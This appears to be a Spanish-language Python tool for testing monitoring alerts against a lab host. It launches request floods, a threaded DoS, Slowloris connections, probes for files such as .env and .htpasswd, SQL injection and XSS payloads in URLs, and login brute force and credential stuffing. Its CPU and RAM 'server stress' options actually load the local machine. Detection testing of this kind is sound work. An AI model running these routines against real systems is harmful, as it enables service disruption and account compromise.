#!/usr/bin/env python3

import requests
import threading
import time
import random
import string
import socket
import os

TARGET = "http://192.168.1.154"
LARAVEL = f"{TARGET}:81"
DJANGO = f"{TARGET}:80"

# Colores
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

def clear():
    os.system('clear')

def print_header():
    clear()
    print(f"{RED}{BOLD}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║           SIMULADOR DE ATAQUES - SOLO PARA PRUEBAS       ║")
    print("║                  Entorno controlado                      ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{RESET}")

def print_menu():
    print_header()
    print(f"{BOLD}Selecciona el ataque a simular:{RESET}\n")
    print(f"  {CYAN}[1]{RESET}  DDoS - Alto número de requests por IP")
    print(f"  {CYAN}[2]{RESET}  Scraping - Alto número de requests por endpoint")
    print(f"  {CYAN}[3]{RESET}  Escaneo de rutas - Spike de errores 4xx")
    print(f"  {CYAN}[4]{RESET}  Fuerza bruta - Alto número de 401/403")
    print(f"  {CYAN}[5]{RESET}  Acceso a archivos sensibles")
    print(f"  {CYAN}[6]{RESET}  Inyección SQL en URLs")
    print(f"  {CYAN}[7]{RESET}  Fuerza bruta en login de Laravel")
    print(f"  {CYAN}[8]{RESET}  Credential stuffing")
    print(f"  {CYAN}[9]{RESET}  Reconocimiento - Requests OPTIONS y HEAD")
    print(f"  {CYAN}[10]{RESET} Buffer overflow - Payloads grandes")
    print(f"  {CYAN}[11]{RESET} DoS - Alto número de conexiones desde una IP")
    print(f"  {CYAN}[12]{RESET} Slowloris - Conexiones lentas simultáneas")
    print(f"  {CYAN}[13]{RESET} Alto uso de CPU (estrés del servidor)")
    print(f"  {CYAN}[14]{RESET} Alto uso de RAM (estrés del servidor)")
    print(f"\n  {RED}[0]{RESET}  Salir\n")

def wait_for_alert():
    print(f"\n{YELLOW}⏳ Simulación en curso... Espera 1-2 minutos y revisa Grafana y Discord.{RESET}")
    print(f"{YELLOW}   Presiona Enter para volver al menú.{RESET}")
    input()

def simulate_ddos():
    print_header()
    print(f"{RED}[1] Simulando DDoS - 150 requests en menos de 1 minuto...{RESET}\n")
    count = 0
    for i in range(150):
        try:
            requests.get(TARGET, timeout=2)
            count += 1
            print(f"\r  Requests enviadas: {count}/150", end="", flush=True)
        except:
            pass
    print(f"\n\n{GREEN}✓ Simulación completada. Se enviaron {count} requests.{RESET}")
    wait_for_alert()

def simulate_scraping():
    print_header()
    print(f"{RED}[2] Simulando scraping - 210 requests al mismo endpoint...{RESET}\n")
    endpoint = f"{DJANGO}/api/producto/"
    count = 0
    for i in range(210):
        try:
            requests.get(endpoint, timeout=2)
            count += 1
            print(f"\r  Requests enviadas: {count}/210", end="", flush=True)
        except:
            pass
    print(f"\n\n{GREEN}✓ Simulación completada. Se enviaron {count} requests a {endpoint}.{RESET}")
    wait_for_alert()

def simulate_4xx_scan():
    print_header()
    print(f"{RED}[3] Simulando escaneo de rutas - 60 requests a rutas inexistentes...{RESET}\n")
    fake_routes = [
        "/admin", "/administrator", "/wp-admin", "/dashboard",
        "/api/users", "/api/admin", "/secret", "/private",
        "/uploads", "/files", "/data", "/db", "/sql",
        "/test", "/dev", "/staging", "/old", "/backup2",
        "/config.php", "/settings.php", "/info.php",
    ]
    count = 0
    for i in range(60):
        route = random.choice(fake_routes)
        try:
            requests.get(f"{TARGET}{route}", timeout=2)
            count += 1
            print(f"\r  Requests enviadas: {count}/60 → {route}", end="", flush=True)
        except:
            pass
    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_401_403():
    print_header()
    print(f"{RED}[4] Simulando fuerza bruta - 25 requests generando 401/403...{RESET}\n")
    count = 0
    for i in range(25):
        try:
            requests.get(
                f"{LARAVEL}/dashboard",
                headers={"Authorization": "Bearer token_invalido"},
                timeout=2
            )
            count += 1
            print(f"\r  Requests enviadas: {count}/25", end="", flush=True)
        except:
            pass
    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_sensitive_files():
    print_header()
    print(f"{RED}[5] Simulando acceso a archivos sensibles...{RESET}\n")
    sensitive = [
        "/.env", "/.git/config", "/config", "/backup",
        "/.htaccess", "/.htpasswd", "/config.yml",
        "/database.yml", "/.env.local", "/.env.production",
    ]
    for path in sensitive:
        try:
            r = requests.get(f"{TARGET}{path}", timeout=2)
            print(f"  {path} → {r.status_code}")
        except:
            print(f"  {path} → error")
        time.sleep(0.2)
    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_sql_injection():
    print_header()
    print(f"{RED}[6] Simulando inyección SQL en URLs...{RESET}\n")
    payloads = [
        "/api/producto/?id=1 UNION SELECT * FROM users",
        "/api/producto/?id=1' OR '1'='1",
        "/api/producto/?id=DROP TABLE users",
        "/api/producto/?id=1; SELECT * FROM information_schema",
        "/api/producto/?search=<script>alert(1)</script>",
        "/api/producto/?id=1 AND 1=1",
        "/api/producto/?id=admin'--",
        "/api/producto/?id=1 EXEC xp_cmdshell",
    ]
    for payload in payloads:
        try:
            r = requests.get(f"{DJANGO}{payload}", timeout=2)
            print(f"  {payload[:60]}... → {r.status_code}")
        except:
            print(f"  {payload[:60]}... → error")
        time.sleep(0.3)
    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_brute_force_login():
    print_header()
    print(f"{RED}[7] Simulando fuerza bruta en login de Laravel - 15 intentos...{RESET}\n")
    passwords = [
        "123456", "password", "admin", "12345678", "qwerty",
        "abc123", "111111", "letmein", "monkey", "dragon",
        "master", "sunshine", "princess", "welcome", "shadow",
    ]
    count = 0
    for pwd in passwords:
        try:
            r = requests.post(
                f"{LARAVEL}/login",
                data={
                    "email": "admin@test.com",
                    "password": pwd,
                    "_token": "fake_token"
                },
                timeout=2,
                allow_redirects=False
            )
            count += 1
            print(f"  Intento {count}/15: password='{pwd}' → {r.status_code}")
        except:
            print(f"  Intento {count}/15: password='{pwd}' → error")
        time.sleep(0.3)
    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_credential_stuffing():
    print_header()
    print(f"{RED}[8] Simulando credential stuffing - 5 usuarios distintos desde esta IP...{RESET}\n")
    users = [
        ("usuario1@test.com", "password1"),
        ("usuario2@gmail.com", "123456"),
        ("admin@empresa.com", "admin123"),
        ("root@servidor.com", "toor"),
        ("test@test.com", "test"),
    ]
    for email, pwd in users:
        try:
            r = requests.post(
                f"{LARAVEL}/login",
                data={
                    "email": email,
                    "password": pwd,
                    "_token": "fake_token"
                },
                timeout=2,
                allow_redirects=False
            )
            print(f"  {email} → {r.status_code}")
        except:
            print(f"  {email} → error")
        time.sleep(0.5)
    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_reconnaissance():
    print_header()
    print(f"{RED}[9] Simulando reconocimiento - 25 requests OPTIONS y HEAD...{RESET}\n")
    endpoints = [
        "/", "/api/", "/api/producto/", "/login",
        "/dashboard", "/admin", "/static/",
    ]
    count = 0
    for i in range(25):
        endpoint = random.choice(endpoints)
        method = random.choice(["OPTIONS", "HEAD"])
        try:
            r = requests.request(method, f"{TARGET}{endpoint}", timeout=2)
            count += 1
            print(f"\r  {method} {endpoint} → {r.status_code} ({count}/25)", end="", flush=True)
        except:
            count += 1
            print(f"\r  {method} {endpoint} → error ({count}/25)", end="", flush=True)
        time.sleep(0.1)
    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_buffer_overflow():
    print_header()
    print(f"{RED}[10] Simulando buffer overflow - Enviando payloads de 2MB...{RESET}\n")
    large_payload = "A" * (2 * 1024 * 1024)
    count = 0
    for i in range(5):
        try:
            r = requests.post(
                f"{TARGET}/api/producto/",
                data={"data": large_payload},
                timeout=5
            )
            count += 1
            print(f"  Request {count}/5 → {r.status_code}")
        except Exception as e:
            count += 1
            print(f"  Request {count}/5 → {str(e)[:50]}")
        time.sleep(0.5)
    print(f"\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_dos():
    print_header()
    print(f"{RED}[11] Simulando DoS - 250 requests en menos de 1 minuto...{RESET}\n")
    count = 0
    lock = threading.Lock()

    def send_request():
        nonlocal count
        try:
            requests.get(TARGET, timeout=2)
            with lock:
                count += 1
                print(f"\r  Requests enviadas: {count}/250", end="", flush=True)
        except:
            pass

    threads = []
    for i in range(250):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()
        time.sleep(0.01)

    for t in threads:
        t.join()

    print(f"\n\n{GREEN}✓ Simulación completada. Se enviaron {count} requests.{RESET}")
    wait_for_alert()

def simulate_slowloris():
    print_header()
    print(f"{RED}[12] Simulando Slowloris - 150 conexiones TCP lentas simultáneas...{RESET}\n")
    sockets = []
    host = "192.168.1.154"
    port = 80

    print(f"  Abriendo conexiones lentas...")
    for i in range(150):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(s)
            print(f"\r  Conexiones abiertas: {len(sockets)}/150", end="", flush=True)
        except:
            pass
        time.sleep(0.05)

    print(f"\n\n  Manteniendo conexiones abiertas por 30 segundos...")
    for i in range(30):
        for s in sockets:
            try:
                s.send(f"X-Header: {i}\r\n".encode())
            except:
                pass
        time.sleep(1)
        print(f"\r  Tiempo restante: {30-i-1}s", end="", flush=True)

    for s in sockets:
        try:
            s.close()
        except:
            pass

    print(f"\n\n{GREEN}✓ Simulación completada. Conexiones cerradas.{RESET}")
    wait_for_alert()

def simulate_cpu_stress():
    print_header()
    print(f"{RED}[13] Simulando alto uso de CPU por 3 minutos...{RESET}\n")
    print(f"  {YELLOW}Esto estresará el CPU real del servidor.{RESET}\n")

    stop = threading.Event()

    def cpu_burn():
        while not stop.is_set():
            n = 99999999
            for i in range(2, int(n**0.5)):
                if n % i == 0:
                    break

    num_cores = os.cpu_count()
    threads = []
    for _ in range(num_cores * 4):  # 4x threads por core
        t = threading.Thread(target=cpu_burn)
        t.daemon = True
        threads.append(t)
        t.start()

    for i in range(180):
        print(f"\r  Estresando {num_cores * 4} threads... {180-i}s restantes", end="", flush=True)
        time.sleep(1)

    stop.set()
    print(f"\n\n{GREEN}✓ Simulación completada.{RESET}")
    wait_for_alert()

def simulate_ram_stress():
    print_header()
    print(f"{RED}[14] Simulando alto uso de RAM...{RESET}\n")
    print(f"  {YELLOW}Esto consumirá RAM real del servidor.{RESET}\n")

    chunks = []
    try:
        for i in range(50):
            chunk = " " * (100 * 1024 * 1024)
            chunks.append(chunk)
            used = (i + 1) * 100
            print(f"\r  RAM consumida: ~{used}MB", end="", flush=True)
            time.sleep(0.5)
    except MemoryError:
        print(f"\n  {YELLOW}Límite de memoria alcanzado.{RESET}")

    print(f"\n\n  Manteniendo uso de RAM por 60 segundos...")
    for i in range(60):
        print(f"\r  Tiempo restante: {60-i}s", end="", flush=True)
        time.sleep(1)

    chunks.clear()
    print(f"\n\n{GREEN}✓ Simulación completada. RAM liberada.{RESET}")
    wait_for_alert()

def main():
    actions = {
        "1": simulate_ddos,
        "2": simulate_scraping,
        "3": simulate_4xx_scan,
        "4": simulate_401_403,
        "5": simulate_sensitive_files,
        "6": simulate_sql_injection,
        "7": simulate_brute_force_login,
        "8": simulate_credential_stuffing,
        "9": simulate_reconnaissance,
        "10": simulate_buffer_overflow,
        "11": simulate_dos,
        "12": simulate_slowloris,
        "13": simulate_cpu_stress,
        "14": simulate_ram_stress,
    }

    while True:
        print_menu()
        choice = input(f"{BOLD}Opción: {RESET}").strip()

        if choice == "0":
            clear()
            print(f"{GREEN}Saliendo...{RESET}\n")
            break
        elif choice in actions:
            actions[choice]()
        else:
            print(f"\n{RED}Opción inválida.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
